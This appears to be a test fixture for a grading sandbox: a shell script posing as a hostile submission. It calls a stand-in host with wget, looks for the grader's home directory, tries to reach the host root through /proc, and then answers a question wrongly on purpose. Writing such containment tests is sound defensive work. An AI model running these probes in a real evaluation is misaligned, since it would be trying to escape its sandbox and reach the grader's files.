#!/bin/sh
# A hostile submission: probes the network and tries to read sensitive paths.
# Expect: the phone home is blocked (no network), /etc/shadow is the *image's*
# (the sandbox's own read-only rootfs — nothing of the grading host exists in
# there), and the grader's own files are unreachable. Then it answers wrong.
read -r question
wget -q -O- http://evil.example.com/collect 2>/dev/null || echo "(phone home blocked)"
ls /home/grader 2>/dev/null || echo "(no grader files: host paths do not exist here)"
cat /proc/1/root/etc/hostname >/dev/null 2>&1 || echo "(no host root via /proc)"
echo "6 * 7 = 54 probably"
